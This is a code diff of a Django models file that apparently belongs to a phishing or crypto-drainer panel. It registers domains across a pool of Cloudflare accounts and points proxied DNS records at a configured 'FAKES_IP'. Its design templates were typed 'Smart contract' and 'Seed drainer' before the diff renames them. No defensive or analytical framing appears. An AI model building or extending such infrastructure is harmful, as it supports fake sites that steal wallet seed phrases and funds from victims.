@@ -100,19 +100,19 @@ class Cloudflare(models.Model):
     created_at = models.DateTimeField("created_at", default=timezone.now)
     
 class Domain(models.Model):
-    name_domain = models.TextField('Name of domain(search function)',blank=False)
+    name = models.TextField('Name of domain (search function)',blank=False)
     user = models.ForeignKey(User, on_delete=models.CASCADE)
     ns1 = models.TextField()
     ns2 = models.TextField()
     cloudId = models.TextField(blank=True, null=True)
     cloud = models.ForeignKey(Cloudflare, on_delete=models.DO_NOTHING, blank=True, null=True)
-    status = models.TextField(default='Waiting for connection')
+    status = models.TextField(default='Ожидание привязки')
     created_at = models.DateTimeField("created_at", default=timezone.now)
     
 
     def createDns(self):
         headers = {'X-Auth-Key': self.cloud.token, 'X-Auth-Email': self.cloud.email, "Content-Type": "application/json"}
-        data = {"type":"A", "name": self.name_domain, "content": settings.FAKES_IP, "ttl":3600, "priority":10, "proxied":True}
+        data = {"type":"A", "name": "*" if self.name.count('.') == 1 else self.name.split('.')[0], "content": settings.FAKES_IP, "ttl":3600, "priority":10, "proxied":True}
         res = requests.post(f"https://api.cloudflare.com/client/v4/zones/{self.cloudId}/dns_records", headers=headers,
                                 json=data).json()
         return res
@@ -120,8 +120,12 @@ class Domain(models.Model):
         
     def addToCloudflare(self):
             cloud = Cloudflare.objects.filter(used__lt=10).first()
+            if cloud is None:
+                return False
             headers = {'X-Auth-Key': cloud.token, 'X-Auth-Email': cloud.email, "Content-Type": "application/json"}
-            data = '{"name":"' + self.name_domain + '","account":{"id":"' + cloud.cloud_id + '"},"jump_start":true,"type":"full"}'
+            name = self.name if self.name.count('.') == 1 else self.name.split('.')[1] + '.' + self.name.split('.')[2]
+            print(name)
+            data = '{"name":"' + name + '","account":{"id":"' + cloud.cloud_id + '"},"jump_start":true,"type":"full"}'
             res = requests.post("https://api.cloudflare.com/client/v4/zones", headers=headers, data=data).json()
             if res["success"] is True:
                 cloud.used += 1
@@ -141,6 +145,7 @@ class Domain(models.Model):
                     }
             elif res["success"] is False:
                 self.delete()
+                print(res)
                 for i in res["errors"]:
                     if i["code"] == 1105:
                         return {
@@ -175,13 +180,13 @@ class Domain(models.Model):
                                     "Content-Type": "application/json"}).json()
         print(res)
         if res['success'] is True:
-            if res['messages'][0]['message'] == "Zone verified!":
-                self.status = "Connected"
-                self.save()
-                return {"status": True, "message": "The domain is successfully linked"}
+                if int(len(res['messages'])) == 0:
+                    return {"status": False, "message": "The domain can be bound for 24 hours"}
 
-            if int(len(res['messages'])) == 0:
-                return {"status": False, "message": "The domain can be bound for 24 hours"}
+                if res['messages'][0]['message'] == "Zone verified!":
+                    self.status = "Connected"
+                    self.save()
+                    return {"status": True, "message": "The domain is successfully linked"}
 
         else:
             return {"status": False, "message": res['errors'][0]['message']}                
@@ -197,12 +202,10 @@ class Link(models.Model):
 
 class Design(models.Model):
     TYPE_CHOICES = (
-        ('Smart contract', 'Smart contract'),
-        ('Seed drainer', 'Seed drainer'),
+        ('LOCO', 'LOCO'),
     )
 
     name = models.TextField()
     img = models.ImageField(upload_to='static/img/designs')
     type = models.TextField(choices=TYPE_CHOICES)
     created_at = models.DateTimeField("created_at", default=timezone.now)
-
